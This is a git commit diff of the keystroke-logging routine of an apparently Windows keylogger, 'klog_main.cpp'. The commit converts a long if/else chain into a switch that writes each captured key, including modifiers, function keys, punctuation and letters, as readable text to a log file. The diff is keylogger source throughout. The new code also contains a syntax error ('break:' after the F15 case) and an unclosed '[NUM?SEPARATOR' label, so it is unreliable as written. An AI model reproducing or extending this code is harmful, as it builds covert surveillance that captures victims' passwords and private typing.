64e8da57caea144237ca303f20df9d7aa7d423ed
ericmccullough <eric_mccullough@hotmail.com>
2018-07-24 15:16:38 -0400

    Change big IF to big SWITCH

--- windows/klog_main.cpp
+++ windows/klog_main.cpp
@@ -90,227 +90,228 @@ int Save(int key_stroke, char *file) {
 	//}
 
 	std::cout << key_stroke << '\n';
-
-	if (key_stroke == VK_CANCEL)
-		fprintf(OUTPUT_FILE, "%s", "[CTRLBREAK]");
-	else if (key_stroke == VK_BACK)
-		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
-	else if (key_stroke == VK_TAB)
-		fprintf(OUTPUT_FILE, "%s", "[TAB]");
-	else if (key_stroke == VK_CLEAR)
-		fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
-	else if (key_stroke == VK_RETURN)
-		fprintf(OUTPUT_FILE, "%s", "[RETURN]\n");
-	else if (key_stroke == VK_SHIFT)
-		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
-	else if (key_stroke == VK_CONTROL)
-		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
-	else if (key_stroke == VK_MENU)
-		fprintf(OUTPUT_FILE, "%s", "[ALT]");
-	else if (key_stroke == VK_PAUSE)
-		fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
-	else if (key_stroke == VK_CAPITAL)
-		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
-
-	else if (key_stroke == VK_ESCAPE)
-		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
-	else if (key_stroke == VK_SPACE)
-		fprintf(OUTPUT_FILE, "%s", " ");
-	else if (key_stroke == VK_PRIOR)
-		fprintf(OUTPUT_FILE, "%s", "[PAGEUP]");
-	else if (key_stroke == VK_NEXT)
-		fprintf(OUTPUT_FILE, "%s", "[PAGEDOWN]");
-	else if (key_stroke == VK_END)
-		fprintf(OUTPUT_FILE, "%s", "[END]");
-	else if (key_stroke == VK_HOME)
-		fprintf(OUTPUT_FILE, "%s", "[HOME]");
-	else if (key_stroke == VK_LEFT)
-		fprintf(OUTPUT_FILE, "%s", "[LARROW]");
-	else if (key_stroke == VK_UP)
-		fprintf(OUTPUT_FILE, "%s", "[UPARROW]");
-	else if (key_stroke == VK_RIGHT)
-		fprintf(OUTPUT_FILE, "%s", "[RARROW]");
-	else if (key_stroke == VK_DOWN)
-		fprintf(OUTPUT_FILE, "%s", "[DOWNARROW]");
-	else if (key_stroke == VK_SELECT)
-		fprintf(OUTPUT_FILE, "%s", "[SELECT]");
-	else if (key_stroke == VK_PRINT)
-		fprintf(OUTPUT_FILE, "%s", "[PRINT]");
-	else if (key_stroke == VK_EXECUTE)
-		fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
-	else if (key_stroke == VK_SNAPSHOT)
-		fprintf(OUTPUT_FILE, "%s", "[PRINTSCREEN]");
-	else if (key_stroke == VK_INSERT)
-		fprintf(OUTPUT_FILE, "%s", "[INSERT]");
-	else if (key_stroke == VK_DELETE)
-		fprintf(OUTPUT_FILE, "%s", "[DELETE]");
-	else if (key_stroke == VK_HELP)
-		fprintf(OUTPUT_FILE, "%s", "[HELP]");
+	switch (key_stroke) {
+	case VK_CANCEL: fprintf(OUTPUT_FILE, "%s", "[CTRLBREAK]");
+		break;
+	case VK_BACK: fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+		break;
+	case VK_TAB: fprintf(OUTPUT_FILE, "%s", "[TAB]");
+		break;
+	case VK_CLEAR: fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
+		break;
+	case VK_RETURN: fprintf(OUTPUT_FILE, "%s", "[RETURN]\n");
+		break;
+	case VK_SHIFT: fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+		break;
+	case VK_CONTROL: fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
+		break;
+	case VK_MENU: fprintf(OUTPUT_FILE, "%s", "[ALT]");
+		break;
+	case VK_PAUSE: fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
+		break;
+	case VK_CAPITAL: fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
+		break;
+	case VK_ESCAPE: fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+		break;
+	case VK_SPACE: fprintf(OUTPUT_FILE, "%s", " ");
+		break;
+	case VK_PRIOR: fprintf(OUTPUT_FILE, "%s", "[PAGEUP]");
+		break;
+	case VK_NEXT: fprintf(OUTPUT_FILE, "%s", "[PAGEDOWN]");
+		break;
+	case VK_END: fprintf(OUTPUT_FILE, "%s", "[END]");
+		break;
+	case VK_HOME: fprintf(OUTPUT_FILE, "%s", "[HOME]");
+		break;
+	case VK_LEFT: fprintf(OUTPUT_FILE, "%s", "[LARROW]");
+		break;
+	case VK_UP: fprintf(OUTPUT_FILE, "%s", "[UPARROW]");
+		break;
+	case VK_RIGHT: fprintf(OUTPUT_FILE, "%s", "[RARROW]");
+		break;
+	case VK_DOWN: fprintf(OUTPUT_FILE, "%s", "[DOWNARROW]");
+		break;
+	case VK_SELECT: fprintf(OUTPUT_FILE, "%s", "[SELECT]");
+		break;
+	case VK_PRINT: fprintf(OUTPUT_FILE, "%s", "[PRINT]");
+		break;
+	case VK_EXECUTE: fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
+		break;
+	case VK_SNAPSHOT: fprintf(OUTPUT_FILE, "%s", "[PRINTSCREEN]");
+		break;
+	case VK_INSERT: fprintf(OUTPUT_FILE, "%s", "[INSERT]");
+		break;
+	case VK_DELETE: fprintf(OUTPUT_FILE, "%s", "[DELETE]");
+		break;
+	case VK_HELP: fprintf(OUTPUT_FILE, "%s", "[HELP]");
+		break;
 	// num and alpha
-	else if (key_stroke == VK_LWIN)
-		fprintf(OUTPUT_FILE, "%s", "[LWIN]");
-	else if (key_stroke == VK_RWIN)
-		fprintf(OUTPUT_FILE, "%s", "[RWIN]");
-	else if (key_stroke == VK_APPS)
-		fprintf(OUTPUT_FILE, "%s", "[APPS]");
-	else if (key_stroke == VK_SLEEP)
-		fprintf(OUTPUT_FILE, "%s", "[SLEEP]");
+	case VK_LWIN: fprintf(OUTPUT_FILE, "%s", "[LWIN]");
+		break;
+	case VK_RWIN: fprintf(OUTPUT_FILE, "%s", "[RWIN]");
+		break;
+	case VK_APPS: fprintf(OUTPUT_FILE, "%s", "[APPS]");
+		break;
+	case VK_SLEEP: fprintf(OUTPUT_FILE, "%s", "[SLEEP]");
+		break;
 	//numpad
-	else if (key_stroke == VK_MULTIPLY)
-		fprintf(OUTPUT_FILE, "%s", "[NUM_MULTIPLY]");
-	else if (key_stroke == VK_ADD)
-		fprintf(OUTPUT_FILE, "%s", "[NUM_ADD]");
-	else if (key_stroke == VK_SEPARATOR)
-		fprintf(OUTPUT_FILE, "%s", "[NUM?SEPARATOR");
-	else if (key_stroke == VK_DIVIDE)
-		fprintf(OUTPUT_FILE, "%s", "[NUM_DIVIDE]");
-
-	else if (key_stroke == VK_F1)
-		fprintf(OUTPUT_FILE, "%s", "[F1]");
-	else if (key_stroke == VK_F2)
-		fprintf(OUTPUT_FILE, "%s", "[F2]");
-	else if (key_stroke == VK_F3)
-		fprintf(OUTPUT_FILE, "%s", "[F3]");
-	else if (key_stroke == VK_F4)
-		fprintf(OUTPUT_FILE, "%s", "[F4]");
-	else if (key_stroke == VK_F5)
-		fprintf(OUTPUT_FILE, "%s", "[F5]");
-	else if (key_stroke == VK_F6)
-		fprintf(OUTPUT_FILE, "%s", "[F6]");
-	else if (key_stroke == VK_F7)
-		fprintf(OUTPUT_FILE, "%s", "[F7]");
-	else if (key_stroke == VK_F8)
-		fprintf(OUTPUT_FILE, "%s", "[F8]");
-	else if (key_stroke == VK_F9)
-		fprintf(OUTPUT_FILE, "%s", "[F9]");
-	else if (key_stroke == VK_F10)
-		fprintf(OUTPUT_FILE, "%s", "[F10]");
-	else if (key_stroke == VK_F11)
-		fprintf(OUTPUT_FILE, "%s", "[F11]");
-	else if (key_stroke == VK_F12)
-		fprintf(OUTPUT_FILE, "%s", "[F12]");
-	else if (key_stroke == VK_F13)
-		fprintf(OUTPUT_FILE, "%s", "[F13]");
-	else if (key_stroke == VK_F14)
-		fprintf(OUTPUT_FILE, "%s", "[F14]");
-	else if (key_stroke == VK_F15)
-		fprintf(OUTPUT_FILE, "%s", "[F15]");
-	else if (key_stroke == VK_F16)
-		fprintf(OUTPUT_FILE, "%s", "[F16]");
-	else if (key_stroke == VK_F17)
-		fprintf(OUTPUT_FILE, "%s", "[F17]");
-	else if (key_stroke == VK_F18)
-		fprintf(OUTPUT_FILE, "%s", "[F18]");
-	else if (key_stroke == VK_F19)
-		fprintf(OUTPUT_FILE, "%s", "[F19]");
-	else if (key_stroke == VK_F20)
-		fprintf(OUTPUT_FILE, "%s", "[F20]");
-	else if (key_stroke == VK_F21)
-		fprintf(OUTPUT_FILE, "%s", "[F21]");
-	else if (key_stroke == VK_F22)
-		fprintf(OUTPUT_FILE, "%s", "[F22]");
-	else if (key_stroke == VK_F23)
-		fprintf(OUTPUT_FILE, "%s", "[F23]");
-	else if (key_stroke == VK_F24)
-		fprintf(OUTPUT_FILE, "%s", "[F24]");
+	case VK_MULTIPLY: fprintf(OUTPUT_FILE, "%s", "[NUM_MULTIPLY]");
+		break;
+	case VK_ADD: fprintf(OUTPUT_FILE, "%s", "[NUM_ADD]");
+		break;
+	case VK_SEPARATOR: fprintf(OUTPUT_FILE, "%s", "[NUM?SEPARATOR");
+		break;
+	case VK_DIVIDE: fprintf(OUTPUT_FILE, "%s", "[NUM_DIVIDE]");
+		break;
+	case VK_F1: fprintf(OUTPUT_FILE, "%s", "[F1]");
+		break;
+	case VK_F2: fprintf(OUTPUT_FILE, "%s", "[F2]");
+		break;
+	case VK_F3: fprintf(OUTPUT_FILE, "%s", "[F3]");
+		break;
+	case VK_F4: fprintf(OUTPUT_FILE, "%s", "[F4]");
+		break;
+	case VK_F5: fprintf(OUTPUT_FILE, "%s", "[F5]");
+		break;
+	case VK_F6: fprintf(OUTPUT_FILE, "%s", "[F6]");
+		break;
+	case VK_F7: fprintf(OUTPUT_FILE, "%s", "[F7]");
+		break;
+	case VK_F8: fprintf(OUTPUT_FILE, "%s", "[F8]");
+		break;
+	case VK_F9: fprintf(OUTPUT_FILE, "%s", "[F9]");
+		break;
+	case VK_F10: fprintf(OUTPUT_FILE, "%s", "[F10]");
+		break;
+	case VK_F11: fprintf(OUTPUT_FILE, "%s", "[F11]");
+		break;
+	case VK_F12: fprintf(OUTPUT_FILE, "%s", "[F12]");
+		break;
+	case VK_F13: fprintf(OUTPUT_FILE, "%s", "[F13]");
+		break;
+	case VK_F14: fprintf(OUTPUT_FILE, "%s", "[F14]");
+		break;
+	case VK_F15: fprintf(OUTPUT_FILE, "%s", "[F15]");
+		break:
+	case VK_F16: fprintf(OUTPUT_FILE, "%s", "[F16]");
+		break;
+	case VK_F17: fprintf(OUTPUT_FILE, "%s", "[F17]");
+		break;
+	case VK_F18: fprintf(OUTPUT_FILE, "%s", "[F18]");
+		break;
+	case VK_F19: fprintf(OUTPUT_FILE, "%s", "[F19]");
+		break;
+	case VK_F20: fprintf(OUTPUT_FILE, "%s", "[F20]");
+		break;
+	case VK_F21: fprintf(OUTPUT_FILE, "%s", "[F21]");
+		break;
+	case VK_F22: fprintf(OUTPUT_FILE, "%s", "[F22]");
+		break;
+	case VK_F23: fprintf(OUTPUT_FILE, "%s", "[F23]");
+		break;
+	case VK_F24: fprintf(OUTPUT_FILE, "%s", "[F24]");
+		break;
 	//
-	else if (key_stroke == VK_NUMLOCK)
-		fprintf(OUTPUT_FILE, "%s", "[NUMLOCK]");
-	else if (key_stroke == VK_SCROLL)
-		fprintf(OUTPUT_FILE, "%s", "[SCROLLLOCK]");
+	case VK_NUMLOCK: fprintf(OUTPUT_FILE, "%s", "[NUMLOCK]");
+		break;
+	case VK_SCROLL: fprintf(OUTPUT_FILE, "%s", "[SCROLLLOCK]");
+		break;
 	//
-	else if (key_stroke == VK_LSHIFT)
-		fprintf(OUTPUT_FILE, "%s", "[LSHIFT]");
-	else if (key_stroke == VK_RSHIFT)
-		fprintf(OUTPUT_FILE, "%s", "[RSHIFT]");
-	else if (key_stroke == VK_LCONTROL)
-		fprintf(OUTPUT_FILE, "%s", "[LCONTROL]");
-	else if (key_stroke == VK_RCONTROL)
-		fprintf(OUTPUT_FILE, "%s", "[RCONTROL]");
-	//else if (key_stroke == VK_LMENU)
-	//	fprintf(OUTPUT_FILE, "%s", "[LMENU]");
-	//else if (key_stroke == VK_RMENU)
-	//	fprintf(OUTPUT_FILE, "%s", "[RMENU]");
-	//else if (key_stroke == VK_BROWSER_BACK)
-	//	fprintf(OUTPUT_FILE, "%s", "[BROWSER_BACK]");
-	//else if (key_stroke == VK_BROWSER_FORWARD)
-	//	fprintf(OUTPUT_FILE, "%s", "[BROWSER_FORWARD]");
-	//else if (key_stroke == VK_BROWSER_REFRESH)
-	//	fprintf(OUTPUT_FILE, "%s", "[BROWSER_REFRESH]");
-	//else if (key_stroke == VK_BROWSER_STOP)
-	//	fprintf(OUTPUT_FILE, "%s", "[BROWSER_STOP]");
-	//else if (key_stroke == VK_BROWSER_SEARCH)
-	//	fprintf(OUTPUT_FILE, "%s", "[BROWSER_SEARCH]");
-	//else if (key_stroke == VK_BROWSER_FAVORITES)
-	//	fprintf(OUTPUT_FILE, "%s", "[BROWSER_FAVORITES]");
-	//else if (key_stroke == VK_BROWSER_HOME)
-	//	fprintf(OUTPUT_FILE, "%s", "[BROWSER_HOME]");
-	//else if (key_stroke == VK_VOLUME_MUTE)
-	//	fprintf(OUTPUT_FILE, "%s", "[VOLUME_MUTE]");
-	//else if (key_stroke == VK_VOLUME_DOWN)
-	//	fprintf(OUTPUT_FILE, "%s", "[VOLUME_DOWN]");
-	//else if (key_stroke == VK_VOLUME_UP)
-	//	fprintf(OUTPUT_FILE, "%s", "[VOLUME_UP]");
-	//else if (key_stroke == VK_MEDIA_NEXT_TRACK)
-	//	fprintf(OUTPUT_FILE, "%s", "[MEDIA_NEXT_TRACK]");
-	//else if (key_stroke == VK_MEDIA_PREV_TRACK)
-	//	fprintf(OUTPUT_FILE, "%s", "[MEDIA_PREV_TRACK]");
-	//else if (key_stroke == VK_MEDIA_STOP)
-	//	fprintf(OUTPUT_FILE, "%s", "[MEDIA_STOP]");
-	//else if (key_stroke == VK_MEDIA_PLAY_PAUSE)
-	//	fprintf(OUTPUT_FILE, "%s", "[MEDIA_PLAY_PAUSE]");
-	//else if (key_stroke == VK_LAUNCH_MAIL)
-	//	fprintf(OUTPUT_FILE, "%s", "[LAUNCH_MAIL]");
-	//else if (key_stroke == VK_LAUNCH_MEDIA_SELECT)
-	//	fprintf(OUTPUT_FILE, "%s", "[LAUNCH_MEDIA_SELECT]");
-	//else if (key_stroke == VK_LAUNCH_APP1)
-	//	fprintf(OUTPUT_FILE, "%s", "[LAUNCH_APP1]");
-	//else if (key_stroke == VK_LAUNCH_APP2)
-	//	fprintf(OUTPUT_FILE, "%s", "[LAUNCH_APP2]");
-
-	else if (key_stroke == VK_OEM_PLUS)
-		fprintf(OUTPUT_FILE, "%s", "+");
-	else if (key_stroke == VK_OEM_COMMA)
-		fprintf(OUTPUT_FILE, "%s", ",");
-	else if (key_stroke == VK_OEM_MINUS || key_stroke == VK_SUBTRACT)
-		fprintf(OUTPUT_FILE, "%s", "-");
-	else if (key_stroke == VK_OEM_PERIOD || key_stroke == VK_DECIMAL)
-		fprintf(OUTPUT_FILE, "%s", ".");
-	else if (key_stroke == VK_OEM_1) {
+	case VK_LSHIFT: fprintf(OUTPUT_FILE, "%s", "[LSHIFT]");
+		break;
+	case VK_RSHIFT: fprintf(OUTPUT_FILE, "%s", "[RSHIFT]");
+		break;
+	case VK_LCONTROL: fprintf(OUTPUT_FILE, "%s", "[LCONTROL]");
+		break;
+	case VK_RCONTROL: fprintf(OUTPUT_FILE, "%s", "[RCONTROL]");
+		break;
+	//case VK_LMENU: fprintf(OUTPUT_FILE, "%s", "[LMENU]");
+	//	break;
+	//case VK_RMENU: fprintf(OUTPUT_FILE, "%s", "[RMENU]");
+	//	break;
+	//case VK_BROWSER_BACK: fprintf(OUTPUT_FILE, "%s", "[BROWSER_BACK]");
+	//	break;
+	//case VK_BROWSER_FORWARD: fprintf(OUTPUT_FILE, "%s", "[BROWSER_FORWARD]");
+	//	break;
+	//case VK_BROWSER_REFRESH: fprintf(OUTPUT_FILE, "%s", "[BROWSER_REFRESH]");
+	//	break;
+	//case VK_BROWSER_STOP: fprintf(OUTPUT_FILE, "%s", "[BROWSER_STOP]");
+	//	break;
+	//case VK_BROWSER_SEARCH: fprintf(OUTPUT_FILE, "%s", "[BROWSER_SEARCH]");
+	//	break;
+	//case VK_BROWSER_FAVORITES: fprintf(OUTPUT_FILE, "%s", "[BROWSER_FAVORITES]");
+	//	break;
+	//case VK_BROWSER_HOME: fprintf(OUTPUT_FILE, "%s", "[BROWSER_HOME]");
+	//	break;
+	//case VK_VOLUME_MUTE: fprintf(OUTPUT_FILE, "%s", "[VOLUME_MUTE]");
+	//	break;
+	//case VK_VOLUME_DOWN: fprintf(OUTPUT_FILE, "%s", "[VOLUME_DOWN]");
+	//	break;
+	//case VK_VOLUME_UP: fprintf(OUTPUT_FILE, "%s", "[VOLUME_UP]");
+	//	break;
+	//case VK_MEDIA_NEXT_TRACK: fprintf(OUTPUT_FILE, "%s", "[MEDIA_NEXT_TRACK]");
+	//	break;
+	//case VK_MEDIA_PREV_TRACK: fprintf(OUTPUT_FILE, "%s", "[MEDIA_PREV_TRACK]");
+	//	break;
+	//case VK_MEDIA_STOP: fprintf(OUTPUT_FILE, "%s", "[MEDIA_STOP]");
+	//	break;
+	//case VK_MEDIA_PLAY_PAUSE: fprintf(OUTPUT_FILE, "%s", "[MEDIA_PLAY_PAUSE]");
+	//	break;
+	//case VK_LAUNCH_MAIL: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_MAIL]");
+	//	break;
+	//case VK_LAUNCH_MEDIA_SELECT: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_MEDIA_SELECT]");
+	//	break;
+	//case VK_LAUNCH_APP1: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_APP1]");
+	//	break;
+	//case VK_LAUNCH_APP2: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_APP2]");
+	//	break;
+	case VK_OEM_PLUS: fprintf(OUTPUT_FILE, "%s", "+");
+		break;
+	case VK_OEM_COMMA: fprintf(OUTPUT_FILE, "%s", ",");
+		break;
+	case VK_OEM_MINUS:
+	case VK_SUBTRACT: fprintf(OUTPUT_FILE, "%s", "-");
+		break;
+	case VK_OEM_PERIOD:
+	case VK_DECIMAL: fprintf(OUTPUT_FILE, "%s", ".");
+		break;
+	case VK_OEM_1:
 		if (lowercase()) fprintf(OUTPUT_FILE, "%s", ";"); // US standard keyboard
 		else fprintf(OUTPUT_FILE, "%s", ":");
-	}
-	else if (key_stroke == VK_OEM_2) {
+		break;
+	case VK_OEM_2:
 		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "/"); // US standard keyboard
 		else fprintf(OUTPUT_FILE, "%s", "?");
-	}
-	else if (key_stroke == VK_OEM_3) {
+		break;
+	case VK_OEM_3:
 		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "`"); // US standard keyboard
 		else fprintf(OUTPUT_FILE, "%s", "~");
-	}
-	else if (key_stroke == VK_OEM_4) {
+		break;
+	case VK_OEM_4:
 		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "["); // US standard keyboard
 		else fprintf(OUTPUT_FILE, "%s", "{");
-	}
-	else if (key_stroke == VK_OEM_5) {
+		break;
+	case VK_OEM_5:
 		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "\\"); // US standard keyboard
 		else fprintf(OUTPUT_FILE, "%s", "|");
-	}
-	else if (key_stroke == VK_OEM_6) {
+		break;
+	case VK_OEM_6:
 		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "]"); // US standard keyboard
 		else fprintf(OUTPUT_FILE, "%s", "}");
-	}
-	else if (key_stroke == VK_OEM_7) {
+		break;
+	case VK_OEM_7:
 		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "'"); // US standard keyboard
 		else fprintf(OUTPUT_FILE, "%s", "\"");
-	}
-	else {
+		break;
+	default:
 		if (key_stroke >= 96 && key_stroke <= 105) { // numpad numbers
 			key_stroke -= 48;
-		} else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
+		}
+		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
 			if (lowercase()) key_stroke += 32;
 		}
 		fprintf(OUTPUT_FILE, "%c", key_stroke);
+		break;
 	}
 	// NOTE: Numpad-Keys seem to print as lowercase letters
 
